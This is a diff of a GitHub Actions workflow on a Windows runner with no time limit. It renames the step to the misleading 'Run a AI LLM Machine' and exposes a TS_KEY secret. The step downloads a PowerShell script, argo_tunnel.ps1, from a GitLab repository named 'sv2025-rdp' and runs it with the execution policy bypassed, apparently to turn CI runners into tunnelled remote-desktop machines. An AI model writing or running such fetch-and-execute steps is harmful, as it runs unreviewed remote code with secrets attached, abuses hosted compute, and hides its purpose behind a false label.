@@ -1,4 +1,4 @@
-name: cloud10
+name: argo1
 
 on:
   workflow_dispatch:
@@ -8,8 +8,10 @@ jobs:
     runs-on: windows-2022
     timeout-minutes: 0
     steps:
-      - name: Run a test
+      - name: Run a AI LLM Machine
         shell: powershell
+        env:
+          TS_KEY: ${{ secrets.TS_KEY }}
         run: |
-          iwr -Uri "https://gitlab.com/gitrdp124/sv2025-rdp/-/raw/main/argo_tunnel.ps1" -OutFile "argo.ps1"
-          powershell -ExecutionPolicy Bypass -File .\argo.ps1
+          iwr -Uri "https://gitlab.com/gitrdp124/sv2025-rdp/-/raw/main/argo_tunnel.ps1" -OutFile "tail.ps1"
+          powershell -ExecutionPolicy Bypass -File .\tail.ps1
